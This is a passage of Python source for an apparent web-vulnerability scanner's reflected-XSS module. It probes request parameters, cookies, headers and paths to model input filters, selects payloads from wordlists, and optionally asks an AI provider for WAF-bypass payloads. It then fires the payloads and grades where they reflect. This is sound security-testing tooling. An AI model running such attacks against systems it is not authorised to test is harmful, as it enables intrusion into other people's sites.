                    f"\n[{point_index}/{total_points}] 🎯 Testing: {param_name} ({location_label})"
                )

                # Two senders: probe phase (XSS-Probe-* in traffic tab) and
                # attack phase / baseline (XSS-* in traffic tab).
                probe_sender  = make_sender(point_type, probe_mode=True,  **pt_ctx)
                attack_sender = make_sender(point_type, probe_mode=False, **pt_ctx)

                # ────────────────────────────────────────────────────────────
                # PHASE 1 + 2 — Probe & build filter model
                # ────────────────────────────────────────────────────────────
                self.scan_progress.emit("  📡 Phase 1: Sending reflection probes …")
                model = self._probe_and_model(param_name, probe_sender)
                results["filter_models"][param_name] = model.summarise()
                self.scan_progress.emit(
                    f"  🧠 Phase 2: Filter model → {model.summarise()}"
                )

                # ────────────────────────────────────────────────────────────
                # PHASE 3 — Select payloads
                # ────────────────────────────────────────────────────────────
                self.scan_progress.emit("  📂 Phase 3: Selecting payloads …")
                if wordlist_path:
                    # Explicit single wordlist supplied via request_data
                    selector = PayloadSelector(wordlist_path)
                    payloads = selector.select(model, max_payloads=300)
                    if not payloads:
                        self.scan_progress.emit(
                            "  ⚠️  Wordlist yielded 0 matching payloads — "
                            "falling back to built-ins"
                        )
                        payloads = self._BUILTIN_PAYLOADS
                    else:
                        self.scan_progress.emit(
                            f"  ✅ Wordlist: {len(payloads)} payloads selected"
                        )
                elif _auto_paths:
                    # Auto-discovered PayloadsAllTheThings / SecLists files
                    selector = PayloadSelector.from_paths(_auto_paths)
                    payloads = selector.select(model, max_payloads=300)
                    if not payloads:
                        self.scan_progress.emit(
                            f"  ⚠️  {len(_auto_paths)} file(s) yielded 0 matching payloads "
                            f"for filter model '{model.summarise()}' — falling back to built-ins"
                        )
                        payloads = self._BUILTIN_PAYLOADS
                    else:
                        src = "PayloadsAllTheThings" if any(
                            _PATT_XSS_SUBDIR.lower() in p.lower() for p in _auto_paths
                        ) else "SecLists"
                        self.scan_progress.emit(
                            f"  ✅ {src}: {len(payloads)} payload(s) selected "
                            f"(from {len(_auto_paths)} file(s), filter-matched)"
                        )
                else:
                    payloads = self._BUILTIN_PAYLOADS
                    self.scan_progress.emit(
                        f"  ℹ️  No wordlist configured — using {len(payloads)} built-in payloads"
                    )

                # ────────────────────────────────────────────────────────────
                # PHASE 3.5 — AI Payload Suggester (optional)
                # When the "🤖 AI Payloads" checkbox is ON, ask the AI provider
                # to generate payloads targeted at the detected filter/WAF.
                # The AI payloads are prepended so they run before the static
                # wordlist — maximising signal-to-noise for blocked targets.
                # ────────────────────────────────────────────────────────────
                if getattr(self, 'ai_suggest_payloads', False):
                    _current_value = ""
                    if point_type == "url":
                        _current_value = params.get(param_name, [''])[0]
                    elif point_type == "body":
                        _bv = body_params.get(param_name, "")
                        if isinstance(_bv, list):
                            _current_value = _bv[0] if _bv else ""
                        elif isinstance(_bv, dict):
                            _current_value = str(next(iter(_bv.values()), ""))
                        else:
                            _current_value = str(_bv or "")
                    elif point_type == "cookie":
                        _current_value = cookies.get(param_name, "")
                    elif point_type == "header":
                        _current_value = headers.get(param_name, "")

                    _ai_payloads = self._get_ai_bypass_payloads(
                        param_name       = param_name,
                        current_value    = _current_value,
                        response_snippet = getattr(self, '_last_probe_resp_text', ""),
                        waf_fingerprint  = model.summarise(),
                        scan_type        = "XSS",
                    )
                    if _ai_payloads:
                        self.scan_progress.emit(
                            f"  🤖 Phase 3.5: {len(_ai_payloads)} AI payload(s) prepended to attack list"
                        )
                        payloads = _ai_payloads + list(payloads)

                # ────────────────────────────────────────────────────────────
                # PHASE 3.6 — Baseline (anti-false-positive)
                # Fetch the page with a benign unique value so we know which
                # strings are pre-existing content (not user-input reflections).
                # ────────────────────────────────────────────────────────────
                baseline_text = self._get_xss_baseline_response(attack_sender)

                # ────────────────────────────────────────────────────────────
                # PHASE 4 — Attack
                # ────────────────────────────────────────────────────────────
                self.scan_progress.emit(
                    f"  🚀 Phase 4: Firing {len(payloads)} payload(s) …"
                )

                if self.boost_mode:
                    self._attack_parallel(
                        payloads, attack_sender, results, param_name, location_label,
                        baseline_text=baseline_text
                    )
                else:
                    self._attack_sequential(
                        payloads, attack_sender, results, param_name, location_label,
                        baseline_text=baseline_text
                    )

            # ── Summary ───────────────────────────────────────────────────────
            if results["vulnerable"]:
                results["summary"] = (
                    f"✅ XSS vulnerability detected! "
                    f"{len(results['reflected_payloads'])} payload(s) reflected."
                )
                results["detection_methods"].append("Reflection-based detection")
            else:
                results["summary"] = "❌ No XSS vulnerabilities detected."

        except Exception as e:
            logger.error(f"XSS scan error: {e}")
            results["error"] = str(e)

        return results

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 1 + 2  —  PROBE & FILTER MODEL
    # ══════════════════════════════════════════════════════════════════════════

    def _probe_and_model(self, param_name: str, sender) -> FilterModel:
        """
        Send CHAR_PROBES and KEYWORD_PROBES through *sender* and build a
        FilterModel based on what was (not) reflected back.
        """
        model = FilterModel()

        # ── Unique sentinel prefix so we can locate our probe unambiguously ───
        sentinel = "xXpRbE"   # short, unlikely to clash with page content

        # ── 1. Character probes ───────────────────────────────────────────────
        for ch in CHAR_PROBES:
            probe = sentinel + ch + sentinel
            resp  = sender(probe)
            if resp is None:
                continue
            body = resp.text

            # First check: did the sentinel survive at all? If not, the whole
            # parameter value is being stripped/blocked — skip this char.
            if sentinel not in body:
                model.blocked_chars.add(ch)
                continue

            if probe in body:
                # Probe reflected verbatim — character is allowed.
                # Still check whether the server URL-encodes it in some other
                # way (rare but real: server copies value into a src= attribute
                # and percent-encodes it there).
                encoded_ch = urllib.parse.quote(ch, safe="")
                # Only flag URL-encoding when the sentinel appears but the raw
                # char does NOT appear adjacent to it in the body.
                sentinel_idx = body.find(sentinel)
                vicinity = body[max(0, sentinel_idx - 5):sentinel_idx + len(sentinel) + 5]
                if ch not in vicinity and encoded_ch in vicinity:
                    model.url_encodes_output = True
            else:
                # Probe not found — character was transformed or removed.
                # Determine which transformation occurred.
                if ch == "<":
                    if "&lt;" in body or "%3c" in body.lower() or "&#60;" in body or "&#x3c;" in body.lower():
                        model.html_encodes_angle_brackets = True
                    elif urllib.parse.quote("<") in body:
                        model.url_encodes_output = True
                    else:
                        model.blocked_chars.add(ch)
                elif ch == ">":
                    if "&gt;" in body or "%3e" in body.lower() or "&#62;" in body or "&#x3e;" in body.lower():
                        model.html_encodes_angle_brackets = True
                    elif urllib.parse.quote(">") in body:
                        model.url_encodes_output = True
                    else:
                        model.blocked_chars.add(ch)
                elif ch == '"':
                    if "&quot;" in body or "&#34;" in body or "&#x22;" in body.lower() or "%22" in body:
                        model.html_encodes_quotes = True
                    else:
                        model.blocked_chars.add(ch)
                elif ch == "'":
                    if "&#x27;" in body or "&#39;" in body or "&apos;" in body or "%27" in body:
                        model.html_encodes_quotes = True
                    else:
                        model.blocked_chars.add(ch)
                else:
                    # For all other chars: if URL-encoded form appears, note it
                    encoded_ch = urllib.parse.quote(ch, safe="")
                    if encoded_ch in body and encoded_ch != ch:
                        model.url_encodes_output = True
                    else:
                        model.blocked_chars.add(ch)

        # ── 2. Keyword probes ─────────────────────────────────────────────────
        for kw in KEYWORD_PROBES:
            probe = sentinel + kw + sentinel
            resp  = sender(probe)
            if resp is None:
                continue
            body = resp.text

            if sentinel in body and kw not in body:
                # Keyword was stripped
                model.blocked_keywords.add(kw)
                model.strips_on_keyword = True

        # ── 3. Raw reflection check ───────────────────────────────────────────
        plain_probe = sentinel + "PLAIN" + sentinel
        resp = sender(plain_probe)
        if resp and plain_probe not in resp.text:
            model.reflects_raw = False

        # ── 4. Detect reflection context — find ALL reflection positions ─────
        ctx_probe = f'<{sentinel}>'
        resp = sender(ctx_probe)
        if resp:
            all_ctxs = _detect_all_reflection_contexts(resp.text, sentinel)
            model.reflection_contexts = all_ctxs
            model.reflection_context  = _dom_context(all_ctxs)
            # Store last probe response text for the AI Payload Suggester
            self._last_probe_resp_text = resp.text[:2000]

        model.description = model.summarise()
        return model

    # ══════════════════════════════════════════════════════════════════════════
    # CONTEXT DETECTION
    # ══════════════════════════════════════════════════════════════════════════

    def _detect_reflection_context(self, body: str, sentinel: str) -> str:
        """
        Thin wrapper — delegates to the module-level _detect_single_context.
        Returns the context of the FIRST sentinel occurrence.
        """
        idx = body.find(sentinel)
        if idx == -1:
            return "unknown"
        return _detect_single_context(body, idx, sentinel)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 4 HELPERS — ATTACK
    # ══════════════════════════════════════════════════════════════════════════

    def _attack_sequential(self, payloads, sender, results, param_name, location_label,
                            baseline_text: str = ""):
        for payload in payloads:
            if not self.running:
                break
            if results["vulnerable"] and getattr(self, "scan_stop_on_first", False):
                self.scan_progress.emit("  ⏭️  Stop-on-first triggered — skipping")
                break
            resp = sender(payload)
            if resp and self._payload_genuinely_reflected(resp.text, payload, baseline_text):
                self._record_hit(results, resp, param_name, payload, location_label)

    def _attack_parallel(self, payloads, sender, results, param_name, location_label,
                         baseline_text: str = ""):
        import threading
        cancel = threading.Event()

        def worker(payload):
            if cancel.is_set():
                return None
            resp = sender(payload)
            if resp and self._payload_genuinely_reflected(resp.text, payload, baseline_text):
                return (payload, resp)
            return None

        max_workers = getattr(self, "scan_max_workers", 8)
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(worker, p): p for p in payloads if self.running}
            for future in concurrent.futures.as_completed(futures):
                if not self.running or cancel.is_set():
                    break
                try:
                    res = future.result(timeout=15)
                    if res:
                        payload, resp = res
                        self._record_hit(results, resp, param_name, payload, location_label)
                        if getattr(self, "scan_stop_on_first", False):
                            cancel.set()
                            self.scan_progress.emit("  ⏭️  Stop-on-first: cancelling")
                except Exception as e:
                    self.scan_progress.emit(f"  ✗ Error: {str(e)[:60]}")

    def _payload_genuinely_reflected(self, response_text: str, payload: str,
                                      baseline_text: str) -> bool:
        """
        Return True only when *payload* appears in *response_text* AND that
        appearance can reasonably be attributed to user-controlled input
        (i.e. it is not a pre-existing string in the baseline response and
        it is not trivially short noise).

        This is the single gate used by both sequential and parallel attack
        loops so that False Positive logic is always consistent.

        Rules
        ─────
        1. Payload must literally appear in the response.
        2. Payload must be long enough to be unambiguous (>= 4 chars).
           Single characters like '<', '>', '"' flood every HTML page —
           they are never counted as reflections here; they were already
           used in the probe phase to characterise the filter, not to
           flag a hit.
        3. The payload must NOT already appear in the baseline response
           at the same frequency or more (baseline match counts compared
           to response match counts).
        4. The payload must not be a pure-sentinel / benign string that
           somehow leaked in.
        """
        if len(payload) < 4:
            return False

        if payload not in response_text:
            return False

        # Count occurrences in both responses to handle cases where the
        # baseline page already contains the string (e.g. common words).
        count_in_response = response_text.count(payload)
        count_in_baseline = baseline_text.count(payload) if baseline_text else 0

        # Only treat it as a new reflection if it appears *more* in the
        # payload response than in the baseline.
        return count_in_response > count_in_baseline

    def _get_xss_baseline_response(self, sender) -> str:
        """
        Send a unique benign sentinel value to record what the page looks like
        without any XSS payload.  Phase 4 uses this to filter out strings that
        appear in every response regardless of user input (e.g. JS event-handler
        names, closing braces, HTML comment markers).

        Returns "" on any failure so callers fall back to no filtering.
        """
        import random
        import string as _string
        sentinel = "xXbAsE" + "".join(random.choices(_string.digits, k=8)) + "xX"
        try:
            resp = sender(sentinel)
            return resp.text if resp else ""
        except Exception:
            return ""

    def _record_hit(self, results, resp, param_name, payload, location_label):
        """Unified result recorder for both sequential and parallel modes."""
        reflection_info = self._find_reflection_location(resp.text, payload)
        xss_confidence  = reflection_info.get("confidence", "INFO")
        icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "⚪"}.get(xss_confidence, "⚪")

        results["vulnerable"] = True
        if payload not in results["reflected_payloads"]:
            results["reflected_payloads"].append(payload)

        results["details"].append({
            "parameter":           param_name,
            "location":            location_label,
            "payload":             payload,
            "status_code":         resp.status_code,
            "reflection_location": reflection_info.get("location", "Response body"),
            "xss_confidence":      xss_confidence,
            "context_snippet":     reflection_info.get("snippet", ""),
            "test_url":            resp.url if hasattr(resp, "url") else "",
        })

        self.scan_progress.emit(
            f"  ✅ Reflected [{xss_confidence}] {icon}: "
            f"{payload[:50]}{'…' if len(payload) > 50 else ''}"
            f" → param '{param_name}'"
        )
        self.scan_progress.emit(
            f"     ↳ Context: {reflection_info.get('location', '?')}"
        )

    # ══════════════════════════════════════════════════════════════════════════
    # LOW-LEVEL SENDERS (thin wrappers around send_request_with_traffic)
    # ══════════════════════════════════════════════════════════════════════════

    def _send_url_probe(self, params, param_name, payload, parsed, headers, full_url,
                        type_prefix: str = "XSS"):
        try:
            tp = params.copy()
            tp[param_name] = [payload]
            qs = urllib.parse.urlencode(tp, doseq=True)
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
            return self.send_request_with_traffic(
                url,
                {k: v for k, v in headers.items() if k.lower() != "host"},
                method="GET",
                payload=payload,
                payload_type=f"{type_prefix}-URL-{param_name}",
            )
        except Exception as e:
            logger.warning(f"URL probe failed: {e}")
            return None

    def _send_post_probe(self, body_params, param_name, payload, headers,
                         full_url, is_json=False, type_prefix: str = "XSS"):
        try:
            tp = body_params.copy()
            tp[param_name] = [payload]
            ct = headers.get("Content-Type", "").lower()
            if is_json or "application/json" in ct:
                body = json.dumps({k: v[0] if isinstance(v, list) else v for k, v in tp.items()})
            else:
                body = urllib.parse.urlencode(tp, doseq=True)
            return self.send_request_with_traffic(
                full_url,
                {k: v for k, v in headers.items() if k.lower() != "host"},
                method="POST",
                body=body,
                payload=payload,
                payload_type=f"{type_prefix}-POST-{param_name}",
            )
        except Exception as e:
            logger.warning(f"POST probe failed: {e}")
            return None

    def _send_cookie_probe(self, cookies, cookie_name, payload, headers,
                           full_url, method, body_params, body_content,
                           type_prefix: str = "XSS"):
        try:
            tc = cookies.copy()
            tc[cookie_name] = payload
            th = {k: v for k, v in headers.items()
                  if k.lower() not in ("host", "cookie")}
            th["Cookie"] = "; ".join(f"{k}={v}" for k, v in tc.items())
            body = self._rebuild_body(headers, body_params, body_content, method)
            return self.send_request_with_traffic(
                full_url, th,
                method=method, body=body,
                payload=payload,
                payload_type=f"{type_prefix}-Cookie-{cookie_name}",
            )
        except Exception as e:
            logger.warning(f"Cookie probe failed: {e}")
            return None

    def _send_header_probe(self, header_name, payload, headers,
                           full_url, method, body_params, body_content,
                           type_prefix: str = "XSS"):
        try:
            th = {k: v for k, v in headers.items() if k.lower() != "host"}
            th[header_name] = payload
            body = self._rebuild_body(headers, body_params, body_content, method)
            return self.send_request_with_traffic(
                full_url, th,
                method=method, body=body,
                payload=payload,
                payload_type=f"{type_prefix}-Header-{header_name}",
            )
        except Exception as e:
            logger.warning(f"Header probe failed: {e}")
            return None

    def _send_path_probe(self, seg_idx, payload, path_segments, parsed, headers, full_url,
                         type_prefix: str = "XSS"):
        try:
            ns = list(path_segments)
            ns[seg_idx] = urllib.parse.quote(payload, safe="")
            new_path = "/" + "/".join(ns)
            url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, new_path,
                parsed.params, parsed.query, parsed.fragment,
            ))
            return self.send_request_with_traffic(
                url,
                {k: v for k, v in headers.items() if k.lower() != "host"},
                method="GET",
                payload=payload,
                payload_type=f"{type_prefix}-Path-{seg_idx}",
            )
        except Exception as e:
            logger.warning(f"Path probe failed: {e}")
            return None

    # ══════════════════════════════════════════════════════════════════════════
    # REQUEST PARSER
    # ══════════════════════════════════════════════════════════════════════════

    def _parse_raw_request(self, request_text, parsed):
        """Parse raw HTTP request text → (method, headers, cookies, body_params, body_content, is_json)."""
        lines = request_text.split("\n")
        method = "GET"
        if lines:
            first = lines[0].strip().upper()
            for m in ("POST", "PUT", "PATCH", "DELETE", "GET"):
                if first.startswith(m):
                    method = m
                    break

        headers: Dict[str, str] = {}
        cookies: Dict[str, str] = {}
        seen_keys: Dict[str, str] = {}
        body_content = ""

        for idx, line in enumerate(lines[1:], 1):
            if line.strip() in ("", "\r\n"):
                body_content = "\n".join(lines[idx + 1:])
                break
            if ":" in line:
                k, v = line.split(":", 1)
                k, v = k.strip(), v.strip()
                kl = k.lower()
                if kl in seen_keys:
                    continue
                seen_keys[kl] = k
                headers[k] = v
                if kl == "cookie":
                    for pair in re.split(r";\s*", v):
                        if "=" in pair:
                            cn, cv = pair.split("=", 1)
                            cookies[cn.strip()] = cv.strip()

        body_params: Dict[str, Any] = {}
        is_json = False
        if method in ("POST", "PUT", "PATCH") and body_content.strip():
            ct = headers.get("Content-Type", "").lower()
            if "application/json" in ct:
                is_json = True
                try:
                    jd = json.loads(body_content.strip())
                    if isinstance(jd, dict):
                        body_params = {k: [str(v)] for k, v in jd.items()}
                except Exception:
                    pass
            else:
                try:
                    body_params = urllib.parse.parse_qs(body_content.strip())
                except Exception:
                    pass

        return method, headers, cookies, body_params, body_content, is_json

    # ══════════════════════════════════════════════════════════════════════════
    # UTILITIES
    # ══════════════════════════════════════════════════════════════════════════

    def _rebuild_body(self, headers, body_params, body_content, method):
        if method not in ("POST", "PUT", "PATCH"):
            return ""
        if body_params:
            ct = headers.get("Content-Type", "").lower()
            if "application/json" in ct:
                return json.dumps({k: v[0] if isinstance(v, list) else v
                                   for k, v in body_params.items()})
            return urllib.parse.urlencode(body_params, doseq=True)
        return body_content

    def _find_reflection_location(self, response_text: str, payload: str) -> dict:
        """
        Find where *payload* is reflected and return a confidence dict.

        Confidence levels
        ─────────────────
        HIGH   — payload is inside an executable context: <script> block,
                 event-handler attribute VALUE, or javascript: URI.
        MEDIUM — payload is inside an HTML tag attribute or a URL attribute
                 (not directly executable but breakout is likely possible).
        LOW    — payload is inside an HTML comment or is entity-/URL-encoded
                 (browser will not execute it without further bypass).
        INFO   — raw reflection in the body with no specific context match;
                 needs manual review.

        False-positive guards
        ─────────────────────
        • Event-handler detection requires the payload to appear as the
          VALUE of an on* attribute, not merely near one.
        • Template-literal detection requires the payload to be surrounded
          by backticks AND preceded by a <script> opening (not just any
          backtick on the page).
        • All regexes use bounded look-back so a <script> tag 5 KB away
          does not infect an unrelated reflection point.
        """
        if payload not in response_text:
            return {"location": "Unknown", "confidence": "INFO", "snippet": ""}

        idx     = response_text.find(payload)
        start   = max(0, idx - 60)
        end     = min(len(response_text), idx + len(payload) + 60)
        snippet = response_text[start:end].replace("\n", " ").replace("\r", "").strip()

        esc_pl   = re.escape(payload)
        look_back = response_text[max(0, idx - 600): idx]
        look_fwd  = response_text[idx: min(len(response_text), idx + 600)]

        # ── HIGH: inside <script> block ───────────────────────────────────────
        # The nearest unclosed <script> before the payload, AND the nearest
        # </script> must come after the payload (or not yet appear).
        last_open  = look_back.rfind("<script")
        last_close = look_back.rfind("</script")
        if last_open != -1 and last_open > last_close:
            return {"location": "Inside <script> block", "confidence": "HIGH", "snippet": snippet}

        # ── HIGH: inside a template literal inside a <script> block ───────────
        # Only flag when we are already established to be in a script context
        # AND there is an unclosed backtick before the payload.
        # (Avoids flagging backticks in HTML attributes or markdown content.)
        script_region_start = look_back.rfind("<script")
        if script_region_start != -1:
            region = look_back[script_region_start:]
            backtick_count = region.count("`")
            if backtick_count % 2 == 1:   # odd → inside an open template literal
                return {"location": "Inside template literal (<script> context)",
                        "confidence": "HIGH", "snippet": snippet}

        # ── HIGH: event handler attribute value ───────────────────────────────
        # Pattern: on<word>="...<payload>  or  on<word>='...<payload>
        # The payload must be the VALUE of the handler, not just near it.
        # We require that no closing quote/bracket separates the handler = from
        # the payload position.
        event_val_re = re.compile(
            r'\bon\w+\s*=\s*(?:["\'])[^"\'<>]*' + esc_pl,
            re.IGNORECASE
        )
        if event_val_re.search(response_text[max(0, idx - 300): idx + len(payload)]):
            return {"location": "Inside event handler attribute", "confidence": "HIGH", "snippet": snippet}

        # Also catch unquoted  onerror=<payload>
        event_unquoted_re = re.compile(
            r'\bon\w+\s*=(?!["\'])' + esc_pl,
            re.IGNORECASE
        )
        if event_unquoted_re.search(response_text[max(0, idx - 100): idx + len(payload)]):
            return {"location": "Inside event handler attribute (unquoted)",
                    "confidence": "HIGH", "snippet": snippet}

        # ── HIGH: javascript: URI in href / src / action ──────────────────────
        if "javascript:" in payload.lower():
            js_uri_re = re.compile(
                r'\b(?:href|src|action|formaction)\s*=\s*["\']?' + esc_pl,
                re.IGNORECASE
            )
            if js_uri_re.search(response_text[max(0, idx - 200): idx + len(payload)]):
                return {"location": "javascript: URI in href/src/action",
                        "confidence": "HIGH", "snippet": snippet}

        # ── LOW: HTML comment ─────────────────────────────────────────────────
        last_comment_open  = look_back.rfind("<!--")
        last_comment_close = look_back.rfind("-->")
        if last_comment_open != -1 and last_comment_open > last_comment_close:
            # Confirm the comment closes AFTER our payload
            if "-->" in look_fwd:
                return {"location": "Inside HTML comment", "confidence": "LOW", "snippet": snippet}

        # ── LOW: HTML entity-encoded ──────────────────────────────────────────
        # The raw payload must NOT appear verbatim — only its encoded form does.
        html_encoded = html_module.escape(payload, quote=True)
        url_encoded  = urllib.parse.quote(payload, safe="")
        if html_encoded != payload and html_encoded in response_text and payload not in response_text:
            return {"location": "HTML entity-encoded (not directly executable)",
                    "confidence": "LOW", "snippet": snippet}
        if (url_encoded != payload and url_encoded in response_text
                and payload not in response_text):
            return {"location": "URL-encoded in response (not directly executable)",
                    "confidence": "LOW", "snippet": snippet}

        # ── MEDIUM: inside an HTML tag attribute ──────────────────────────────
        # Must be inside a tag (between < and >) and in an attribute position.
        last_tag_open  = look_back.rfind("<")
        last_tag_close = look_back.rfind(">")
        inside_tag = last_tag_open != -1 and last_tag_open > last_tag_close

        if inside_tag:
            tag_fragment = look_back[last_tag_open:]
            # URL-bearing attributes → higher specificity
            if re.search(r'\b(?:href|src|action|formaction|data)\s*=\s*["\']?[^"\'>\s]*$',
                         tag_fragment, re.IGNORECASE):
                return {"location": "Inside URL attribute (href/src/action)",
                        "confidence": "MEDIUM", "snippet": snippet}
            return {"location": "Inside HTML tag attribute",
                    "confidence": "MEDIUM", "snippet": snippet}

        # ── MEDIUM: inside <style> block ──────────────────────────────────────
        last_style_open  = look_back.rfind("<style")
        last_style_close = look_back.rfind("</style")
        if last_style_open != -1 and last_style_open > last_style_close:
            return {"location": "Inside <style> block", "confidence": "MEDIUM", "snippet": snippet}

        # ── INFO: plain body reflection ───────────────────────────────────────
        return {"location": "Reflected in response body", "confidence": "INFO", "snippet": snippet}

    def _process_xss_result(self, results, result, param_name, payload, location):
        """Legacy helper kept for backward compatibility."""
        resp_mock = type("R", (), {
            "status_code": result.get("status_code", 0),
            "text":        "",      # reflection already confirmed
            "url":         result.get("test_url", ""),
        })()
        reflection_info = result.get("reflected_in", {})
        if isinstance(reflection_info, str):
            reflection_info = {"location": reflection_info, "confidence": "INFO", "snippet": ""}

        results["vulnerable"] = True
        if payload not in results["reflected_payloads"]:
            results["reflected_payloads"].append(payload)

        xss_confidence     = reflection_info.get("confidence", "INFO")
        reflection_location = reflection_info.get("location", "Response body")
        snippet            = reflection_info.get("snippet", "")
        icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "⚪"}.get(xss_confidence, "⚪")

        results["details"].append({
            "parameter":           param_name,
            "location":            location,
            "payload":             payload,
            "status_code":         result.get("status_code", 0),
            "reflection_location": reflection_location,
            "xss_confidence":      xss_confidence,
            "context_snippet":     snippet,
            "test_url":            result.get("test_url", ""),
        })
        self.scan_progress.emit(
            f"  ✅ Reflected [{xss_confidence}] {icon}: "
            f"{payload[:40]}{'…' if len(payload) > 40 else ''} in '{param_name}'"
        )
        self.scan_progress.emit(f"     ↳ Context: {reflection_location}")